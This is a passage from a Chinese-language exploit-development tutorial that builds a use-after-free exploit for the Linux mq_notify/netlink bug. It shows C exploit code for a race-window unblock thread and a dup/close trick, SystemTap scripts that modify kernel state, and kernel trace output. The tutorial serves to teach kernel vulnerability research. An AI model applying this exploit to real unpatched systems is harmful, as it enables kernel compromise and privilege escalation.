class="keyword">else</span></span><br><span class="line">          nlk-&gt;flags &amp;= ~NETLINK_RECV_NO_ENOBUFS;</span><br><span class="line">        err = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        err = -ENOPROTOOPT;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> err;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在setsockopt()中的检查还有：</p>
<ul>
<li>[5] - <strong>level</strong>等于SOL_NETLINK</li>
<li>[6] - <strong>optlen</strong>必须大于等于<em>sizeof(int)<em>并且</em></em>optval**是可读地址</li>
<li>[7] - <strong>optname</strong>等于NETLINK_NO_ENOBUFS</li>
<li>[8] - <strong>val</strong>不等于0</li>
</ul>
<p>如果我们通过了所有的检查，walk_up_interruptible()将会被调用，被阻塞的进程会被唤醒，下列代码片段就是用来触发它的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> sock_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_GENERIC); <span class="comment">// same socket used by blocking thread</span></span><br><span class="line"><span class="keyword">int</span> val = <span class="number">3535</span>; <span class="comment">// different than zero</span></span><br><span class="line">_setsockopt(sock_fd, SOL_NETLINK, NETLINK_NO_ENOBUFS, &amp;val, <span class="keyword">sizeof</span>(val));</span><br></pre></td></tr></table></figure>

<h4 id="Updating-The-Exploit"><a href="#Updating-The-Exploit" class="headerlink" title="Updating The Exploit"></a>Updating The Exploit</h4><p>在之前的小节中，我们知道了如何通过setsockopt()系统调用从用户态来触发wake_up_interruptible()，但仍有个问题：如何在我们自己被阻塞的时候去调用其他函数？答案就是利用多线程。所以我们将创建另一个线程（调用<strong>unblock_thread</strong>）并更新我们的exploit（使用”-pthread”编译）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">unblock_thread_arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">int</span> fd;</span><br><span class="line">  <span class="keyword">bool</span> is_ready;  <span class="comment">// we could use pthread&#x27;s barrier here instead</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">unblock_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">unblock_thread_arg</span> *<span class="title">uta</span> = (<span class="title">struct</span> <span class="title">unblock_thread_arg</span>*) <span class="title">arg</span>;</span></span><br><span class="line">  <span class="keyword">int</span> val = <span class="number">3535</span>; <span class="comment">// need to be different than zero</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// notify the main thread that the unblock thread has been created</span></span><br><span class="line">  uta-&gt;is_ready = <span class="literal">true</span>; </span><br><span class="line">  <span class="comment">// WARNING: the main thread *must* directly call mq_notify() once notified!</span></span><br><span class="line">  sleep(<span class="number">5</span>); <span class="comment">// gives some time for the main thread to block</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[unblock] unblocking now\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (_setsockopt(uta-&gt;fd, SOL_NETLINK, NETLINK_NO_ENOBUFS, &amp;val, <span class="keyword">sizeof</span>(val)))</span><br><span class="line">    perror(<span class="string">&quot;setsockopt&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sigevent</span> <span class="title">sigev</span>;</span></span><br><span class="line">  <span class="keyword">char</span> sival_buffer[NOTIFY_COOKIE_LEN];</span><br><span class="line">  <span class="keyword">int</span> sock_fd;</span><br><span class="line">  <span class="keyword">pthread_t</span> tid;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">unblock_thread_arg</span> <span class="title">uta</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// ... cut ...</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// initialize the unblock thread arguments, and launch it</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;uta, <span class="number">0</span>, <span class="keyword">sizeof</span>(uta));</span><br><span class="line">  uta.fd = sock_fd;</span><br><span class="line">  uta.is_ready = <span class="literal">false</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;creating unblock thread...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ((errno = pthread_create(&amp;tid, <span class="literal">NULL</span>, unblock_thread, &amp;uta)) != <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> fail;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (uta.is_ready == <span class="literal">false</span>) <span class="comment">// spinlock until thread is created</span></span><br><span class="line">    ;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;unblocking thread has been created!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;get ready to block\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (_mq_notify((<span class="keyword">mqd_t</span>)<span class="number">-1</span>, &amp;sigev))</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;mq_notify&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> fail;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;mq_notify succeed\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ... cut ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可能有人会注意到代码中调用了sleep(5)和修改了uta-&gt;is_ready，下面来解释一下。</p>
<p>调用<strong>pthread_create()**用于创建线程（即新的task_struct）并启动它。创建任务并不意味着任务将立即运行。为了确保线程已经开始运行，我们使用自旋锁</strong>uta-&gt;is_ready**。</p>
<p>注：自旋锁是最简单的(active)锁，它循环直到变量状态改变。它active是因为在此期间CPU使用率99%。有人可能想要使用类似原子的变量，但这里不需要，因为只有一个writer和一个reader。</p>
<p>主线程陷入无限循环直到unblock_thread解锁它（将is_ready设置为true）。使用多线程可以实现同样的目的（但它并不总是可用）。注意，这里的自旋锁是可自定义的，它只是对线程创建提供了更多控制。如果使用其他进程来实现这个目的话，通常会干扰到攻击，因为创建进程可能意味着大量内存分配。第3部分将需要相同的技术，所以先不在这里介绍它。</p>
<p>另一方面，我们假设在pthread_create()之后，我们的主线程被抢占了“很长”的时间段（即没有执行）。我们有以下顺序：</p>
<p>(图待上传)</p>
<p>在这种情况下，调用setsockopt()在mq_notify阻塞之前。也就是说，setsockopt并不会解锁主线程。这是解锁主线程后进行sleep的原因。换句话说，它至少有5秒钟的时间来调用mq_notify()，可以放心地认为5秒钟足够，因为：</p>
<ul>
<li>如果主线程在5秒后仍然被抢占，则目标系统负载很重，也无论如何都没办法执行exploit</li>
<li>如果unblock_thread与主线程（setsockopt在mq_notify()之前执行）竞争，那么我们总是可以发送一个CTRL+C命令。这样会使得netlink_attachskb()返回-ERESTARTSYS。该路径中未触发bug，我们可以重新运行exploit</li>
</ul>
<p>换句话说，“受控窗口”的持续时间现在是5秒。有的人可能认为这种方式有点简陋，但问题是主线程没用办法通知对方将其唤醒，因为它被阻塞。也许unblock_thread可能可以以某种方式去查询某些信息，但在这里使用sleep就足够了。</p>
<h4 id="Updating-The-STAP-Script"><a href="#Updating-The-STAP-Script" class="headerlink" title="Updating The STAP Script"></a>Updating The STAP Script</h4><p>在运行新的exploit之前，我们需要重新修改STAP脚本。现在，我们在调用netlink_attachskb()之前将netlink socket(fd=3)移除，这意味着我们在进入netlink_attachskb()之后调用setsockopt时，sock_fd是无效的，从而导致setsockopt调用失败。所以我们需要在netlink_attachskb()返回时移除fd 3：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">function force_trigger_before:<span class="keyword">long</span> (arg_sock:<span class="keyword">long</span>)</span><br><span class="line">%&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">netlink_sock</span> &#123;</span></span><br><span class="line">	<span class="comment">/* struct sock has to be the first member of netlink_sock */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock</span>		<span class="title">sk</span>;</span></span><br><span class="line">	u32			portid;</span><br><span class="line">	u32			dst_portid;</span><br><span class="line">	u32			dst_group;</span><br><span class="line">	u32			flags;</span><br><span class="line">	u32			subscriptions;</span><br><span class="line">	u32			ngroups;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		*groups;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		state;</span><br><span class="line">	<span class="keyword">size_t</span>			max_recvmsg_len;</span><br><span class="line">	<span class="keyword">wait_queue_head_t</span>	wait;</span><br><span class="line">	<span class="keyword">bool</span>			cb_running;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">netlink_callback</span>	<span class="title">cb</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>		*<span class="title">cb_mutex</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>		<span class="title">cb_def_mutex</span>;</span></span><br><span class="line">	<span class="keyword">void</span>			(*netlink_rcv)(struct sk_buff *skb);</span><br><span class="line">	<span class="keyword">int</span>			(*netlink_bind)(<span class="keyword">int</span> group);</span><br><span class="line">	<span class="keyword">void</span>			(*netlink_unbind)(<span class="keyword">int</span> group);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module</span>		*<span class="title">module</span>;</span></span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> = (<span class="title">void</span>*) <span class="title">STAP_ARG_arg_sock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">netlink_sock</span> *<span class="title">nlk</span> = (<span class="title">void</span>*) <span class="title">sk</span>;</span></span><br><span class="line">  nlk-&gt;state |= <span class="number">1</span>;   <span class="comment">// enter the netlink_attachskb() retry path    </span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// <span class="doctag">NOTE:</span> We do not mark the sock as DEAD anymore</span></span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">function force_trigger_after:<span class="keyword">long</span> (arg_sock:<span class="keyword">long</span>)</span><br><span class="line">%&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> *<span class="title">files</span> = <span class="title">current</span>-&gt;<span class="title">files</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> *<span class="title">fdt</span> = <span class="title">files_fdtable</span>(<span class="title">files</span>);</span></span><br><span class="line">  fdt-&gt;fd[<span class="number">3</span>] = <span class="literal">NULL</span>; <span class="comment">// makes the second call to fget() fails</span></span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">probe kernel.function(<span class="string">&quot;netlink_attachskb&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (execname()==<span class="string">&quot;exploit&quot;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;(%d-%d) &gt;&gt;&gt; netlink_attachskb (%s)\n&quot;</span>, pid(), tid(), $$parms)</span><br><span class="line">		force_trigger_before($sk)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">probe kernel.function(<span class="string">&quot;netlink_attachskb&quot;</span>).<span class="keyword">return</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (execname()==<span class="string">&quot;exploit&quot;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;(%d-%d) &lt;&lt;&lt; netlink_attachskb = %x\n&quot;</span>, pid(), tid(), $<span class="keyword">return</span>)</span><br><span class="line">		force_trigger_after(<span class="number">0</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们在netlink_attachskb()中被阻塞5秒，然后另一线程将主线程恢复并使得netlink_attachskb()返回了1。</p>
<p>在本节中，我们知道了如何控制竞争并无限延长窗口（设置为了5秒）。然后我们使用setsockopt唤醒主线程。 我们还介绍了可能在我们的漏洞利用中发生的条件竞争，我们了解了如何通过简单的技巧降低其发生概率。最后，我们仅使用用户态代码删除了由旧脚本满足的一个要求（将SOCK标记为DEAD）。</p>
<h3 id="Making-fget-Fail-on-Second-Loop"><a href="#Making-fget-Fail-on-Second-Loop" class="headerlink" title="Making fget() Fail on Second Loop"></a>Making <em>fget()</em> Fail on Second Loop</h3><p>到此为止，我们还有两个要求需要满足：</p>
<ol>
<li>强制netlink_attachskb()返回1</li>
<li>强制第二次fget()返回NULL</li>
<li>[已完成]唤醒主线程</li>
</ol>
<p>在本章节中，我们将会尝试让第二次fget()返回NULL，这将让我们在第二次循环中进入到exit的路径：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">retry:</span><br><span class="line">	filp = fget(notification.sigev_signo);</span><br><span class="line">	<span class="keyword">if</span> (!filp) &#123;</span><br><span class="line">		ret = -EBADF;</span><br><span class="line">		<span class="keyword">goto</span> out;           <span class="comment">// &lt;--------- on the second loop only!</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h4 id="为什么fget-会返回NULL"><a href="#为什么fget-会返回NULL" class="headerlink" title="为什么fget()会返回NULL"></a>为什么fget()会返回NULL</h4><p>通过System Tap，重置目标fd的FDT项能够使得fget()返回NULL：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> *<span class="title">files</span> = <span class="title">current</span>-&gt;<span class="title">files</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> *<span class="title">fdt</span> = <span class="title">files_fdtable</span>(<span class="title">files</span>);</span></span><br><span class="line">fdt-&gt;fd[<span class="number">3</span>] = <span class="literal">NULL</span>; <span class="comment">// makes the second call to fget() fails</span></span><br></pre></td></tr></table></figure>

<p>**fget()**所做的事：</p>
<ol>
<li>获得<em>current</em>进程的结构体files_struct</li>
<li>获得结构体files_struct的fdtable结构体</li>
<li>获得fdt-&gt;fd[fd]的值</li>
<li>将file结构体的refcounter（如果不为NULL）递增1</li>
<li>返回file结构体的指针</li>
</ol>
<p>简而言之，如果特定文件描述符的FDT条目为NULL，则fget()返回NULL。</p>
<h4 id="Reset-an-Entry-in-the-File-Descriptor-Table"><a href="#Reset-an-Entry-in-the-File-Descriptor-Table" class="headerlink" title="Reset an Entry in the File Descriptor Table"></a>Reset an Entry in the File Descriptor Table</h4><p>在STAP脚本中，我们重置了fd 3的fdt入口。我们如何在用户态中完成这件事？有什么办法可以设置fdt？答案就是close()系统调用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">// [fs/open.c]</span></span><br><span class="line"></span><br><span class="line">    SYSCALL_DEFINE1(close, <span class="keyword">unsigned</span> <span class="keyword">int</span>, fd)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">file</span> * <span class="title">filp</span>;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> *<span class="title">files</span> = <span class="title">current</span>-&gt;<span class="title">files</span>;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> *<span class="title">fdt</span>;</span></span><br><span class="line">      <span class="keyword">int</span> retval;</span><br><span class="line"></span><br><span class="line">[<span class="number">0</span>]   fdt = files_fdtable(files);</span><br><span class="line">[<span class="number">1</span>]   filp = fdt-&gt;fd[fd];</span><br><span class="line">[<span class="number">2</span>]   rcu_assign_pointer(fdt-&gt;fd[fd], <span class="literal">NULL</span>); <span class="comment">// &lt;----- equivalent to: fdt-&gt;fd[fd] = NULL</span></span><br><span class="line">[<span class="number">3</span>]   retval = filp_close(filp, files);</span><br><span class="line">      <span class="keyword">return</span> retval;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>close()系统调用：</p>
<ul>
<li>[0] - 获得当前进程的FDT</li>
<li>[1] - 通过FDT获得指定fd的file结构体</li>
<li>[2] - <strong>将相应的FDT项设置为NULL（无条件）</strong></li>
<li>[3] - 将file的引用减去1（即调用fput()）</li>
</ul>
<p>因此，这种简单的方法可以重置FDT条目。 然而，它带来了另一个问题。</p>
<h4 id="An-Egg-and-Chicken-Issue…"><a href="#An-Egg-and-Chicken-Issue…" class="headerlink" title="An Egg and Chicken Issue…"></a>An Egg and Chicken Issue…</h4><p>在调用setsockopt()之前调用unblock_thread中的close()是很诱人的。问题是setsockopt()需要一个有效的文件描述符。我们已经通过STAP尝试过它，这就是为什么我们在从netlink_attachskb()返回时添加了fdt重置的代码，而不是netlink_attachskb()调用之前。我们在用户态中遇到同样的问题……</p>
<p>在setsocktopt()之后调用close()会怎么样？如果我们在调用setsockopt()（唤醒主线程）之后调用close()，就不利用扩展的条件竞争的窗口。我们不希望这样。</p>
<p>幸运的是，在Core Concept＃1中，已经说过文件描述符表不是1：1映射。也就是说，几个文件描述符可能指向同一个文件对象。如何使两个文件描述符指向相同的struct文件？使用dup()系统调用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">// [fs/fcntl.c]</span></span><br><span class="line"></span><br><span class="line">    SYSCALL_DEFINE1(dup, <span class="keyword">unsigned</span> <span class="keyword">int</span>, fildes)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> ret = -EBADF;</span><br><span class="line">[<span class="number">0</span>]   <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span> = <span class="title">fget</span>(<span class="title">fildes</span>);</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (file) &#123;</span><br><span class="line">[<span class="number">1</span>]     ret = get_unused_fd();</span><br><span class="line">        <span class="keyword">if</span> (ret &gt;= <span class="number">0</span>)</span><br><span class="line">[<span class="number">2</span>]       fd_install(ret, file); <span class="comment">// &lt;----- equivalent to: current-&gt;files-&gt;fdt-&gt;fd[ret] = file</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          fput(file);</span><br><span class="line">      &#125;</span><br><span class="line">[<span class="number">3</span>]   <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>dup()的操作正式我们想要的：</p>
<ul>
<li>[0] - 从文件描述符中获取文件对象的引用</li>
<li>[1] - 选择一个可用的fd</li>
<li>[2] - 使用指向struct file对象的指针设置此新文件描述符的fdt条目</li>
<li>[3] - 返回新的fd</li>
</ul>
<p>最后，我们将拥有两个引用相同file结构体的文件描述符：</p>
<ul>
<li><strong>sock_fd</strong>：被mq_notify()和close()使用</li>
<li><strong>unblock_fd</strong>：被setsockopt()使用</li>
</ul>
<h4 id="更新Exploit"><a href="#更新Exploit" class="headerlink" title="更新Exploit"></a>更新Exploit</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">unblock_thread_arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">int</span> sock_fd;</span><br><span class="line">  <span class="keyword">int</span> unblock_fd;     <span class="comment">// &lt;----- used by the &quot;unblock_thread&quot;</span></span><br><span class="line">  <span class="keyword">bool</span> is_ready;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">unblock_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// ... cut ...</span></span><br><span class="line"></span><br><span class="line">  sleep(<span class="number">5</span>); <span class="comment">// gives some time for the main thread to block</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[unblock] closing %d fd\n&quot;</span>, uta-&gt;sock_fd);</span><br><span class="line">  _close(uta-&gt;sock_fd);                               <span class="comment">// &lt;----- close() before setsockopt()</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[unblock] unblocking now\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (_setsockopt(uta-&gt;unblock_fd, SOL_NETLINK,       <span class="comment">// &lt;----- use &quot;unblock_fd&quot; now!</span></span><br><span class="line">                  NETLINK_NO_ENOBUFS, &amp;val, <span class="keyword">sizeof</span>(val)))</span><br><span class="line">    perror(<span class="string">&quot;setsockopt&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// ... cut ...</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((uta.unblock_fd = _dup(uta.sock_fd)) &lt; <span class="number">0</span>)         <span class="comment">// &lt;----- dup() after socket() </span></span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;dup&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> fail;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[main] netlink fd duplicated = %d\n&quot;</span>, uta.unblock_fd);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ... cut ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>移除STAP脚本中的FDT清空代码后执行。测试结果如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">(2853-2853) &gt;&gt;&gt; mq_notify (4294967295, 0x7ffdc2f2f1b0)</span><br><span class="line">(2853-2853) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(2853-2853) &gt;&gt;&gt; alloc_skb (priority=? size=?)</span><br><span class="line">(2853-2853) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(2853-2853) &gt;&gt;&gt; skb_put (skb=0xffff88003e3c1e00 len=0x20)</span><br><span class="line">(2853-2853) &lt;&lt;&lt; skb_put = ffff880037398000</span><br><span class="line">(2853-2853) &gt;&gt;&gt; __fdget (fd=0x3)</span><br><span class="line">(2853-2853) &lt;&lt;&lt; __fdget = ffff880038cb1501</span><br><span class="line">(2853-2853) &gt;&gt;&gt; netlink_getsockbyfilp (filp=0xffff880038cb1500)</span><br><span class="line">(2853-2853) &lt;&lt;&lt; netlink_getsockbyfilp = ffff88003b8f9800</span><br><span class="line">(2853-2853) &gt;&gt;&gt; netlink_attachskb (sk=0xffff88003b8f9800 skb=0xffff88003e3c1e00 timeo=0xffff880036ad3f08 ssk=0x0)</span><br><span class="line">(2853-2854) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(2853-2854) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(2853-2854) &gt;&gt;&gt; __fdget (fd=?)</span><br><span class="line">(2853-2854) &gt;&gt;&gt; copy_from_user()</span><br><span class="line">(2853-2854) &gt;&gt;&gt; __fdget (fd=0x4)</span><br><span class="line">(2853-2854) &lt;&lt;&lt; __fdget = ffff880038cb1501</span><br><span class="line">(2853-2853) &lt;&lt;&lt; netlink_attachskb = 1</span><br><span class="line">(2853-2853) &gt;&gt;&gt; __fdget (fd=0x3)</span><br><span class="line">(2853-2853) &lt;&lt;&lt; __fdget = 0</span><br><span class="line">(2853-2853) &gt;&gt;&gt; netlink_detachskb (sk=0xffff88003b8f9800 skb=0xffff88003e3c1e00)</span><br><span class="line">(2853-2853) &gt;&gt;&gt; kfree (objp=0xffff880037398000)</span><br><span class="line">(2853-2853) &gt;&gt;&gt; kfree (objp=0xffff88003b8f9800)</span><br><span class="line">(2853-2853) &lt;&lt;&lt; netlink_detachskb</span><br><span class="line">-=&#123; dump_netlink_sock: 0xffff88003b8f9800 